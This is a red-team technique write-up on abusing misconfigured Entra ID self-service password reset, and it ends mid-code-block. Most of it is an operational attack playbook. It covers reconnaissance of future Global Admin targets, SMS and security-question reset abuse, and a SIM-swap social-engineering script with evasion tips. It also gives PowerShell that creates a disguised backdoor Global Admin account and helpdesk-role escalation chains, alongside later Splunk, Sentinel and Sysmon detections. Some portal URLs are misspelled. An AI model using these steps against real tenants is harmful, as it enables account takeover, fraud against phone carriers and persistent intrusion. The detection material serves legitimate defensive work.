# PE-ACCTMGMT-013: Self-Service Password Reset Misconfiguration

**Full File Path:** `04_PrivEsc/PE-ACCTMGMT-013_SSPR.md`

---

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-013 |
| **MITRE ATT&CK v18.1** | [T1098.001 - Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Privilege Escalation (TA0004) |
| **Platforms** | Cloud (Azure/Entra ID), Hybrid (with password writeback) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID deployments; Azure AD with SSPR enabled; Microsoft 365 with SSPR; Azure AD Connect 1.4.0+ with password writeback |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Self-Service Password Reset (SSPR) misconfiguration attacks exploit weak verification methods and insufficient MFA enforcement to reset user and administrative account passwords without proper authentication. An attacker can leverage vulnerable recovery mechanisms (SMS/security questions), combined with social engineering or telecom-level attacks (SIM swapping), to compromise accounts and escalate privileges. The attack becomes particularly critical when targeting accounts scheduled to receive Global Administrator role assignments via PIM, allowing the attacker to gain elevated access before role activation occurs.

**Attack Surface:**
- **Entra ID SSPR Portal** (login.microsoftonline.com)
- **Azure Portal SSPR Configuration** (Identity → Users → Password reset)
- **Entra Admin Center** (Protection → Authentication methods)
- **Microsoft Graph APIs** (UserAuthMethod endpoints)
- **Telecom Provider Infrastructure** (for SIM swapping variant)
- **SSPR Verification Methods** (Email, SMS, Mobile App, Security Questions)

**Business Impact:** **An attacker with SSPR access can reset passwords for cloud and hybrid user accounts, including administrative accounts, achieving complete account takeover.** If combined with SIM swapping, an attacker can compromise even accounts with SSPR enabled. For future Global Admins waiting for PIM role activation, password reset enables the attacker to own the account before privileges are activated.

**Technical Context:** Password resets via SSPR typically complete in seconds to minutes. If weak verification methods (SMS/security questions) are enabled, resets require only compromised phone number or guessed answers. The reset is immediately logged in Entra ID audit logs with the specific verification methods used, but many organizations lack real-time alerting. Multi-factor SSPR (2+ methods) significantly raises the bar but is not enforced by default for non-admin accounts.

### Operational Risk

- **Execution Risk:** Low-Medium. If SSPR is misconfigured with single-factor reset or SMS-only, exploitation is trivial. If properly configured (2+ methods, strong authenticators), risk is High due to SIM swapping prevalence.
- **Stealth:** Medium. SSPR resets are logged with initiating user, but attacker can blend reset with legitimate user activity by timing attacks during business hours.
- **Reversibility:** No. Once password is reset, attacker has account access. Legitimate user is locked out. Changes made during compromise window persist.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3.1 | SSPR must require multi-factor verification (minimum 2 methods) for all users. |
| **DISA STIG** | V-72983 | Multi-factor authentication required for password resets; SMS alone insufficient. |
| **CISA SCuBA** | MS.AAD.4.1 | SSPR must require multiple authentication methods; SMS phone not sole method. |
| **NIST 800-53** | IA-2, IA-4 | Identification and Authentication; Authentication Strength for privilege elevation. |
| **NIST 800-207** | Zero Trust | Continuous verification; assume compromise of single factors (SMS). |
| **GDPR** | Art. 32 | Security of Processing; strong authentication controls for account recovery. |
| **DORA** | Art. 9 | Protection and Prevention; secure credential management. |
| **NIS2** | Art. 21 | Cyber Risk Management; strong authentication for sensitive accounts. |
| **ISO 27001** | A.9.4.2 | Secure Authentication; MFA for account recovery. |
| **ISO 27005** | Risk Scenario: "Credential Compromise via Weak Recovery" | Account compromise via insecure password reset methods. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (for exploitation):**
  - Compromised user account with SSPR enabled (ANY account), OR
  - Helpdesk Administrator account (can reset passwords for non-admin users), OR
  - Attacker capable of SIM swapping (social engineering telecom support)

- **Required Access:**
  - Network access to Entra ID SSPR portal (https://account.activedirectory.windowsazure.com/PasswordReset/), OR
  - Access to user's registered recovery email/phone number, OR
  - Control of user's phone number (SIM swap attack)

**Supported Versions:**
- **Entra ID:** All versions (SSPR available with P1+ licensing)
- **Azure AD:** All versions with SSPR enabled
- **Microsoft 365:** All versions
- **PowerShell:** Version 5.0+
- **Azure AD Connect:** 1.4.0+ (if password writeback enabled)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (v1.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- [Impacket](https://github.com/fortra/impacket) (0.10.0+)
- Native: PowerShell 7.x, Browser (for SSPR portal), Mobile Authenticator app

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Management Station / PowerShell Reconnaissance

#### Check if SSPR is Enabled and Configuration

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Identity.Read.All", "Directory.Read.All"

# Check SSPR policy status
$sspr = Get-MgBetaIdentitySelfServicePasswordResetPolicy

Write-Host "SSPR Enabled for All Users: $($sspr.IsEnabled)"
Write-Host "Number of Authentication Methods Required: $($sspr.NumberOfAuthenticationMethodsRequired)"

# Enumerate authentication methods required
if ($sspr.NumberOfAuthenticationMethodsRequired -eq 1) {
    Write-Host "WARNING: Single authentication method required - VULNERABLE TO SIM SWAP"
} elseif ($sspr.NumberOfAuthenticationMethodsRequired -ge 2) {
    Write-Host "GOOD: Multiple authentication methods required"
}
```

**What to Look For:**
- **IsEnabled = True** - SSPR is active (attack surface exists)
- **NumberOfAuthenticationMethodsRequired = 1** - Critical misconfiguration; vulnerable to single-method attacks
- **NumberOfAuthenticationMethodsRequired >= 2** - Better security; still vulnerable to SIM swap if SMS is enabled

#### Enumerate Enabled Authentication Methods for SSPR

```powershell
# Get authentication methods policy
$policy = Get-MgBetaPolicyAuthenticationMethodsPolicy

# Check which methods are enabled for SSPR
$policy.AuthenticationMethodConfigurations | Where-Object { $_.Id -match "sms" -or $_.Id -match "email" -or $_.Id -match "security" } | ForEach-Object {
    Write-Host "Method: $($_.DisplayName), Enabled: $($_.State)"
}

# Specifically check for SMS (most vulnerable)
$sms = $policy.AuthenticationMethodConfigurations | Where-Object { $_.Id -eq "sms" }
if ($sms.State -eq "enabled") {
    Write-Host "CRITICAL: SMS authentication enabled - vulnerable to SIM swapping"
}
```

**What to Look For:**
- **SecurityQuestion** enabled without limits - Vulnerable to social engineering
- **SMS (MobilePhone)** enabled as sole method - Vulnerable to SIM swapping
- **MobileApp (Authenticator) / FIDO2** enabled - Stronger methods
- If SMS and Email only - relatively vulnerable; requires both compromised
- If Authenticator or FIDO2 required - Much stronger

#### Check for Upcoming PIM Role Assignments (Privilege Escalation Target)

```powershell
# Connect with elevated permissions
Connect-MgGraph -Scopes "RoleManagement.Read.Directory", "Directory.Read.All"

# Get all upcoming role assignments
$eligibleAssignments = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All

# Filter for future activations (start date in future)
$eligibleAssignments | Where-Object { $_.StartDateTime -gt (Get-Date) } | Select-Object `
    PrincipalId, RoleDefinitionId, StartDateTime | ForEach-Object {
    
    $user = Get-MgUser -UserId $_.PrincipalId -ErrorAction SilentlyContinue
    $role = Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId -ErrorAction SilentlyContinue
    
    Write-Host "User: $($user.UserPrincipalName), Role: $($role.DisplayName), StartDate: $($_.StartDateTime)"
}
```

**What to Look For:**
- Any future Global Administrator role assignments (these are high-value targets)
- Users without strong MFA protection assigned to privileged roles
- Assignments starting within next 24-48 hours (timing for immediate attack)

### 4.2 Linux/Bash / CLI Reconnaissance

```bash
# Using Azure CLI to check SSPR configuration
az rest --method GET \
  --uri "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy" \
  --headers "Content-Type=application/json" | jq '.authenticationMethodConfigurations[] | select(.id | test("sms|email|securityQuestion"))'

# Check if user has SSPR enabled
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/users/{USER_ID}/authentication/methods" | jq '.value[] | {id, type}'
```

**What to Look For:**
- JSON objects showing enabled authentication methods
- Absence of strong authenticator methods (Authenticator app, FIDO2)
- Presence of SMS/email as primary methods

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct SSPR via Weak Verification Methods (Single-Factor Attack)

**Supported Versions:** All Entra ID with SSPR enabled and misconfigured to allow single authentication method

#### Step 1: Identify Target User and Verification Method

**Objective:** Determine which SSPR verification method the target user has registered.

**Command (via SSPR Portal):**
Open browser and navigate to: `https://account.activedirectory.windowsazure.com/PasswordReset/`

1. Enter target user's UPN (e.g., `globaladmin@company.onmicrosoft.com`)
2. Click "Next" at identity verification stage
3. **SSPR portal displays which verification methods are available** (without requiring completion)
4. Attacker determines easiest method to exploit

**What to Look For:**
- **"We sent a code to your email"** - Email-based recovery (can be phished if forwarding not configured)
- **"We'll call/text your phone"** - SMS/phone call (vulnerable to SIM swap)
- **"Answer your security questions"** - Guessable via social engineering
- **"Use your Authenticator app"** - Strong; difficult to compromise

**OpSec & Evasion:**
- Don't complete the verification step (this logs activity as "attempted SSPR")
- Perform reconnaissance during off-hours if possible
- Note: This step DOES generate an event in audit logs (failed SSPR attempt), but may not trigger immediate alerts

**Troubleshooting:**
- **Error:** "SSPR is not enabled for this user"
  - **Cause:** User excluded from SSPR policy
  - **Fix:** Target a user confirmed to have SSPR enabled

**References & Proofs:**
- [Microsoft Entra SSPR Portal](https://account.activedirectory.windowsazure.com/PasswordReset/)
- [SSPR Configuration Guide](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-sspr-deployment)

#### Step 2: Exploit the Identified Verification Method

**Objective:** Reset the target user's password using the vulnerable verification method.

**Scenario A: SMS-Based Password Reset (Vulnerable to SIM Swap)**

**Command (Attacker's Browser):**
```
1. Navigate to: https://account.activedirectory.windowsazure.com/PasswordReset/
2. Enter target UPN
3. Select "I can't access my authenticator app" or similar
4. Choose "Text me a code" (if available)
5. Attacker receives SMS OTP on their phone (if they've successfully SIM-swapped)
6. Enter OTP
7. Set new password: "AttackerP@ssw0rd123!"
8. Click "Finish"
```

**What This Means:**
- Password reset is successful
- Target user is now locked out of their own account
- Attacker has full access using new credentials
- All M365 services (Teams, OneDrive, Exchange) are now accessible to attacker

**OpSec & Evasion:**
- If using SIM swap method, ensure SIM swap completes before attempting SSPR (takes 15-60 minutes typically)
- Use VPN/proxy from different geographic location than user's normal login pattern
- Reset password to something that blends with organizational password standards
- Create backdoor account (new service account) during this window before detection
- Do NOT immediately login; wait 24+ hours to avoid detection of simultaneous access
- Detection likelihood: High if alerts configured; Medium if no real-time monitoring

**Scenario B: Security Question-Based Reset (Vulnerable to Guessing)**

```
1. Navigate to: https://account.activedirectory.windowsaxure.com/PasswordReset/
2. Enter target UPN
3. Select "I can answer my security questions"
4. Answer the security questions (attacker researches answers via LinkedIn, Facebook, public records)
   - Question: "What was the name of your first pet?"
   - Public research: User's Instagram shows pet name
   - Answer: "Fluffy"
5. If 2 questions required, research both answers
6. Set new password
7. Click "Finish"
```

**What This Means:**
- Complete account compromise via OSINT and social engineering
- No MFA or technical bypass required
- Attacker now owns the account

**OpSec & Evasion:**
- Research answers using LinkedIn, Facebook, Instagram, Twitter BEFORE attempting reset
- Use information from user's professional profile and personal social media
- Timing doesn't matter as much (security questions don't have time-sensitive nature like OTP)
- Detection likelihood: Low if alert thresholds are high; Medium if behavioral analytics enabled

**Troubleshooting:**
- **Error:** "Incorrect answer to security question"
  - **Cause:** Attacker's research was inaccurate
  - **Fix:** Try variations (middle names, alternate spellings, common pet names)
- **Error:** "Too many failed attempts. Please try again later"
  - **Cause:** Rate limiting on security questions
  - **Fix:** Wait 1-2 hours and retry with better researched answers

**References & Proofs:**
- [Security Questions Vulnerability Research](https://blog.hypr.com/making-self-service-password-reset-and-account-recovery-secure)
- [Password Reset Abuse Case Study](https://www.obsidiansecurity.com/blog/behind-the-breach-self-service-password-reset-azure-ad)

#### Step 3: Verify Access and Establish Persistence

**Objective:** Confirm password reset worked and create persistent backdoor.

**Command:**
```powershell
# Test compromised credentials
$cred = New-Object System.Management.Automation.PSCredential("globaladmin@company.onmicrosoft.com", (ConvertTo-SecureString "AttackerP@ssw0rd123!" -AsPlainText -Force))

# Connect as compromised user
Connect-MgGraph -Credential $cred -Scopes "Directory.Read.All", "RoleManagement.Read.Directory"

# Verify access
Get-MgContext | Select-Object Account, Tenant

# Create backdoor service account (if Global Admin)
$backdoor = New-MgUser -DisplayName "System Compliance Account" `
  -MailNickname "syscompliance" `
  -UserPrincipalName "syscompliance@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "B@ckd00rP@ss!" } `
  -AccountEnabled $true

# Assign Global Admin role
New-MgRoleManagementDirectoryRoleAssignment `
  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
  -PrincipalId $backdoor.Id `
  -DirectoryScopeId "/"

Write-Host "Backdoor established: syscompliance@company.onmicrosoft.com"
```

**Expected Output:**
```
Account: globaladmin@company.onmicrosoft.com
Tenant: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Backdoor established: syscompliance@company.onmicrosoft.com
```

**What This Means:**
- Attacker has confirmed access to compromised admin account
- Backdoor account created, ensuring persistence even if original account is recovered
- Attacker can now perform any administrative action (data exfiltration, mailbox access, etc.)

---

### METHOD 2: SIM Swapping Attack (Telecom-Level Attack)

**Supported Versions:** All Entra ID with SMS-based SSPR enabled

#### Step 1: Social Engineering Telecom Provider

**Objective:** Convince telecom support that attacker owns the target's phone number and should receive their SIM card.

**Process (Non-Technical):**
```
1. Research target user's phone details:
   - Phone carrier (AT&T, Verizon, etc.) - visible in LinkedIn, social media, or obtained via OSINT
   - Account holder name (from LinkedIn profile)
   - Potential account number (may be implied or guessed)

2. Contact telecom support via phone
   - Claim to have lost SIM card or bought new phone
   - Request SIM swap / phone number transfer
   - Provide information about "your account"

3. Telecom support verifies identity via:
   - Last 4 digits of phone number (you claim)
   - Account PIN (guess or social engineer)
   - Last phone call details (may be able to guess)
   - Address associated with account (research via public records)

4. If verification passes, new SIM card is activated with target's phone number
   - This typically takes 15-60 minutes
   - Target's legitimate SIM is deactivated

5. Attacker now receives all SMS messages sent to target's number
```

**What to Look For:**
- Target user will lose cellular service and connectivity
- Legitimate user will notice immediately
- This creates a tight time window for SSPR exploit

**OpSec & Evasion:**
- Time attack for when target is offline (evenings, weekends, vacations)
- Have SSPR ready to execute immediately after SIM swap completes
- Complete full account compromise (password reset + backdoor creation) before legitimate user regains phone service
- Use VPN from different country to delay phone recovery call
- Detection likelihood: Very High (target will contact IT within hours); window is 1-3 hours typically

**Troubleshooting:**
- **Error:** Telecom support asks for verification you can't provide
  - **Cause:** Carrier has stronger verification procedures
  - **Fix:** Try different carriers (some have weaker controls); try calling during night shift when less experienced staff available
- **Error:** Target's legitimate account regains service before you finish
  - **Cause:** Timing was off; target noticed and called carrier
  - **Fix:** Be faster; ensure all persistence mechanisms in place before recovery

**References & Proofs:**
- [Coalition Inc. Case Study: SIM Swapping to SSPR](https://www.coalitioninc.com/blog/security-labs/sim-swapping-extortion)
- [Krebs on Security: SIM Swap Attacks](https://krebsonsecurity.com/all-articles-by-topic/sim-swapping/)

#### Step 2: Execute SSPR Immediately After SIM Swap

**Objective:** Reset password before legitimate user recovers phone service.

**Command (Attacker's Browser, on Compromised Phone with Attacker's SIM):**
```
1. Open browser on any device (phone with attacker's SIM or other computer)
2. Navigate to: https://account.activedirectory.windowsaxure.com/PasswordReset/
3. Enter target UPN
4. Select "Text me a code"
5. Enter phone number: TARGET_PHONE_NUMBER (your now-SIM-swapped number)
6. SMS arrives on attacker's SIM
7. Enter OTP code
8. Set new password
9. Login to compromised account and create backdoor immediately
```

**What This Means:**
- Attacker has 1-3 hours before legitimate user recovers service
- Legitimate user is completely locked out
- All M365, cloud storage, email is compromised
- Attacker must work quickly to establish persistence

**OpSec & Evasion:**
- Do not log in as target for routine activities; use backdoor service account instead
- Disable MFA on compromised account if possible (removes detection trigger)
- Set up mail forwarding and calendar access immediately
- Download sensitive files to external storage
- Ensure backdoor account has:
  - Strong password
  - Authenticator app MFA under attacker's control
  - Alternative email address for recovery
- Expect discovery within 2-8 hours when legitimate user regains phone service

---

### METHOD 3: Helpdesk Administrator Password Reset (Lateral Privilege Escalation)

**Supported Versions:** All Entra ID with Helpdesk Administrator role assigned

#### Step 1: Compromise or Impersonate Helpdesk Administrator

**Objective:** Obtain valid Helpdesk Admin credentials or impersonate one.

**Command:**
```powershell
# Option 1: Attacker has already compromised helpdesk admin account
$helpdesk_cred = New-Object System.Management.Automation.PSCredential("helpdesk@company.onmicrosoft.com", (ConvertTo-SecureString "Compromised_Password" -AsPlainText -Force))

Connect-MgGraph -Credential $helpdesk_cred -Scopes "Directory.Read.All", "UserAuthenticationMethod.ReadWrite.All", "Directory.ReadWrite.All"

# Verify Helpdesk role
$user = Get-MgUser -UserId "helpdesk@company.onmicrosoft.com"
$roles = Get-MgUserMemberOf -UserId "helpdesk@company.onmicrosoft.com"
$roles | Where-Object { $_.DisplayName -contains "Helpdesk" }
```

**What to Look For:**
- Helpdesk Administrator role confirmed
- Permissions: Can reset passwords for non-admin users

#### Step 2: Identify Target User for Escalation

**Objective:** Find user who has or will have elevated privileges but is currently reset-able by Helpdesk Admin.

**Command:**
```powershell
# Get all users assigned to Password Administrator role (example escalation target)
$passwordAdmins = Get-MgDirectoryRole -Filter "displayName eq 'Password Administrator'" | `
  Get-MgDirectoryRoleMember

# Get all users eligible for Global Admin in future (PIM targets)
$futureGlobalAdmins = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'"

$futureGlobalAdmins | ForEach-Object {
    $user = Get-MgUser -UserId $_.PrincipalId
    Write-Host "Target: $($user.UserPrincipalName), Activation Date: $($_.StartDateTime)"
}
```

**What to Look For:**
- Users with Password Admin, User Admin, or Exchange Admin roles
- Future PIM-eligible Global Admin assignments
- Users without strong MFA protection

#### Step 3: Reset Password of Target User

**Objective:** Reset target's password to attacker-controlled value using Helpdesk Admin authority.

**Command:**
```powershell
# Get the target user
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'target@company.onmicrosoft.com'"

# Reset their password via Microsoft Graph
$password = "NewElevatedUserPassword123!"
$params = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = $password
    }
}

Update-MgUser -UserId $targetUser.Id -BodyParameter $params

Write-Host "Password reset successful for: $($targetUser.UserPrincipalName)"
Write-Host "New password: $password"
```

**Expected Output:**
```
Password reset successful for: target@company.onmicrosoft.com
New password: NewElevatedUserPassword123!
```

**What This Means:**
- Target user's password changed by Helpdesk Admin
- Attacker now has credentials to login as target
- If target has administrative role, attacker inherits those permissions

**OpSec & Evasion:**
- Use justifiable reason for reset (claim user forgot password, account locked)
- Reset password to something reasonable (not obviously suspicious)
- Log the reset with business reason in documentation
- Do not immediately login as target; wait 24+ hours
- If possible, trigger legitimate helpdesk ticket first to provide cover
- Detection likelihood: Medium (helpdesk password resets are frequent); depends on monitoring policy

#### Step 4: Use Escalated Account to Reset Future Global Admin

**Objective:** If target is Password Administrator, use their role to reset Global Admin account before PIM activation.

**Command:**
```powershell
# Login as target user (who has Password Admin role)
$target_cred = New-Object System.Management.Automation.PSCredential("target@company.onmicrosoft.com", (ConvertTo-SecureString "NewElevatedUserPassword123!" -AsPlainText -Force))

Connect-MgGraph -Credential $target_cred -Scopes "Directory.Read.All", "UserAuthenticationMethod.ReadWrite.All", "Directory.ReadWrite.All"

# Find Global Admin account (the one scheduled for future PIM activation)
$futureGlobalAdmin = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" | `
  Where-Object { $_.StartDateTime -gt (Get-Date) } | Select-Object -First 1

$globalAdminUser = Get-MgUser -UserId $futureGlobalAdmin.PrincipalId

# Reset their password
$newPassword = "PersistencePassword456!"
$params = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = $newPassword
    }
}

Update-MgUser -UserId $globalAdminUser.Id -BodyParameter $params

Write-Host "Global Admin password reset before activation: $($globalAdminUser.UserPrincipalName)"
```

**What This Means:**
- Even though Global Admin role activation is scheduled, attacker now controls the account
- When role activation occurs, attacker has credentials to the Global Admin account
- Privilege escalation chain complete

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Integration

- **Atomic Test ID:** T1098.001-3 (Additional Cloud Credentials - Password Reset)
- **Test Name:** "Reset User Password via SSPR"
- **Description:** Simulate password reset of cloud user account via self-service portal.
- **Supported Versions:** All Entra ID versions

**Command:**
```powershell
Invoke-AtomicTest T1098.001 -TestNumbers 3
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1098.001 -TestNumbers 3 -Cleanup
```

**Reference:** [Atomic Red Team T1098.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.001/T1098.001.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### 7.1 Microsoft Graph PowerShell SDK

**Version:** 1.0+
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage - Reset User Password:**
```powershell
Connect-MgGraph -Scopes "Directory.ReadWrite.All"
$params = @{ passwordProfile = @{ password = "NewPassword123!" } }
Update-MgUser -UserId "user@company.onmicrosoft.com" -BodyParameter $params
```

### 7.2 Azure CLI

**Version:** 2.40.0+
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Usage - Get SSPR Policy:**
```bash
az rest --method GET \
  --uri "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy" | jq '.authenticationMethodConfigurations'
```

### 7.3 One-Liner Scripts

**SSPR Portal Direct Access (One-Liner):**
```powershell
Start-Process "https://account.activedirectory.windowsazure.com/PasswordReset/"
```

**Reset Password as Helpdesk Admin (One-Liner):**
```powershell
Connect-MgGraph -Scopes "Directory.ReadWrite.All"; Update-MgUser -UserId "user@company.onmicrosoft.com" -BodyParameter @{passwordProfile=@{password="P@ssw0rd123!"}}
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: SSPR Password Reset Events

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, InitiatedBy.user.userPrincipalName, TargetResources[0].userPrincipalName, additionalDetails
- **Alert Threshold:** Any successful SSPR event
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Reset password (self-service)" result=success
| stats count min(_time) as firstTime max(_time) as lastTime by InitiatedBy.user.userPrincipalName
| rename InitiatedBy.user.userPrincipalName as user
| table user, firstTime, lastTime, count
| where count >= 1
```

**What This Detects:**
- Every successful SSPR event
- User performing reset
- Timestamp of reset
- Can be tuned to detect resets of admin accounts specifically

### Rule 2: Single Authentication Method SSPR (Vulnerable Configuration)

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, additionalDetails (MethodsUsedForValidation)
- **Alert Threshold:** SSPR using only 1 method
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Reset password (self-service)" result=success
| mvexpand additionalDetails
| search additionalDetails.key="MethodsUsedForValidation"
| eval methodCount=mvcount(split(additionalDetails.value, ","))
| where methodCount=1
| rename InitiatedBy.user.userPrincipalName as user
| table user, additionalDetails.value
| alert
```

**What This Detects:**
- SSPR resets using only a single verification method
- Vulnerable to SIM swap or security question attacks
- Method used (SMS, email, security question)

### Rule 3: SSPR on Admin Accounts

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** TargetResources[0].userPrincipalName, operationName, Result
- **Alert Threshold:** Any SSPR on admin account
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Reset password (self-service)" 
| eval targetUser=TargetResources[0].userPrincipalName
| where targetUser IN ("globaladmin@*", "*admin*@*", "*privileged*@*")
| alert
```

**What This Detects:**
- Password resets for administrative accounts
- High-risk resets
- Potential privilege escalation

### Rule 4: Multiple SSPR Attempts (SIM Swap Indicator)

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** InitiatedBy.user.ipAddress, _time, TargetResources[0].userPrincipalName
- **Alert Threshold:** >3 SSPR attempts in 30 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Reset password (self-service)"
| stats count min(_time) as firstTime max(_time) as lastTime by TargetResources[0].userPrincipalName
| eval duration=lastTime-firstTime
| where count > 3 AND duration < 1800
| alert
```

**What This Detects:**
- Multiple password reset attempts in short timeframe
- Pattern consistent with SIM swap attack (user trying multiple verification methods)
- Potential account takeover in progress

---

## 9. MICROSOFT SENTINEL DETECTION RULES (KQL)

### Sentinel Rule 1: SSPR via SMS (SIM Swap Risk)

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Reset password (self-service)"
| extend methodDetails = tostring(AdditionalDetails)
| extend methodsUsed = extract_all(@'MethodsUsedForValidation["\']?\s*[=\:]\s*["\']?([^"\']+)', methodDetails)
| where methodsUsed contains "SMS" or methodsUsed contains "Phone"
| extend Actor = tostring(InitiatedBy.user.userPrincipalName)
| extend Target = tostring(TargetResources[0].userPrincipalName)
| project TimeGenerated, Actor, Target, methodsUsed
```

**What This Detects:**
- SSPR resets using SMS/phone verification
- Indicates vulnerability to SIM swapping
- Can be tuned to alert on ANY SMS SSPR or only admin accounts

### Sentinel Rule 2: Helpdesk Admin Password Reset Suspicious Pattern

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
let helpdeskAdmins = AuditLogs
  | where OperationName == "Add member to role completed"
  | extend role = tostring(TargetResources[0].displayName)
  | where role == "Helpdesk Administrator"
  | extend admin = tostring(InitiatedBy.user.userPrincipalName)
  | distinct admin;
AuditLogs
| where OperationName == "Reset password (by admin)"
| extend admin = tostring(InitiatedBy.user.userPrincipalName)
| where admin in (helpdeskAdmins)
| extend target = tostring(TargetResources[0].userPrincipalName)
| where target contains "admin" or target contains "privileged"
| project TimeGenerated, admin, target
```

**What This Detects:**
- Helpdesk admins resetting passwords of other administrators
- Unusual escalation pattern
- Potential privilege escalation attack

### Sentinel Rule 3: SSPR Followed by Privileged Activity

**Applies To Versions:** All Entra ID (requires SigninLogs and AuditLogs)

**KQL Query:**
```kusto
let sspr = AuditLogs
  | where OperationName == "Reset password (self-service)"
  | extend resetUser = tostring(InitiatedBy.user.userPrincipalName)
  | extend resetTime = TimeGenerated
  | project resetUser, resetTime;
AuditLogs
| where OperationName startswith "Add member to role"
| extend privUser = tostring(TargetResources[0].userPrincipalName)
| extend privTime = TimeGenerated
| join kind=inner (sspr) on $left.privUser == $right.resetUser
| where privTime > resetTime and privTime < (resetTime + 2h)
| project resetTime, privTime, resetUser, OperationName
```

**What This Detects:**
- Password reset immediately followed by role assignment
- Attacker creates backdoor/escalates after SSPR compromise
- Privilege escalation chain

---

## 10. EVENT LOG & WINDOWS AUDIT DETECTION

### On-Premises AD Event Mapping (if password writeback enabled)

| Event ID | Source | Meaning | SSPR Attack Indicator |
|---|---|---|---|
| 4724 | Security (DC) | Password Reset (by admin) | Helpdesk Admin resetting user password |
| 4723 | Security (DC) | Password Change | User changing password via SSPR writeback |
| 4738 | Security (DC) | User Account Changed | Attribute modification from cloud |
| 5136 | Directory Services | Attribute Modified | On-prem AD change from cloud sync |

**Audit Rule Configuration:**
```powershell
# Enable auditing for password resets
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable
```

---

## 11. SYSMON DETECTION (On-Premises)

**Note:** Sysmon on domain controllers can detect password reset tools.

### Sysmon Rule: Monitor for Password Reset Tools

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">Set-ADAccountPassword</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">dsmod</Image>
      <CommandLine condition="contains">user</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**What This Detects:**
- Local password reset attempts on domain controllers
- Lateral movement from compromised admin account

---

## 12. MITIGATIONS & INCIDENT RESPONSE

### Immediate Mitigation (0-24 hours)

1. **Force Password Reset for Compromised Account:**
   ```powershell
   # Reset password and force user to change on next login
   $params = @{
       passwordProfile = @{
           forceChangePasswordNextSignIn = $true
           password = "RandomP@ssw0rd123!"
       }
   }
   Update-MgUser -UserId "compromised@company.onmicrosoft.com" -BodyParameter $params
   ```

2. **Disable SSPR if Misconfigured:**
   ```powershell
   # Temporarily disable SSPR until configuration is fixed
   Update-MgBetaIdentitySelfServicePasswordResetPolicy -IsEnabled $false
   ```

3. **Revoke All Sessions:**
   ```powershell
   Get-MgUser -UserId "compromised@company.onmicrosoft.com" | Revoke-MgUserSigninSession
   ```

### Short-Term Mitigation (24-72 hours)

1. **Audit All Recent SSPR Resets:**
   ```powershell
   # Export SSPR events from last 30 days
   $events = Get-MgAuditLogDirectoryAudit -Filter "createdDateTime ge $(Get-Date).AddDays(-30)" | `
     Where-Object { $_.OperationName -like "*Reset password*" }
   
   $events | Select-Object CreatedDateTime, InitiatedBy, TargetResources | Export-Csv -NoTypeInformation
   ```

2. **Review and Strengthen SSPR Configuration:**
   - Set NumberOfAuthenticationMethodsRequired to 2 (minimum)
   - Disable SMS/Security Questions if possible
   - Require Authenticator App or FIDO2
   - Enable geographic risk detection

3. **Implement Conditional Access for SSPR:**
   ```powershell
   # Create CA policy requiring MFA for password reset
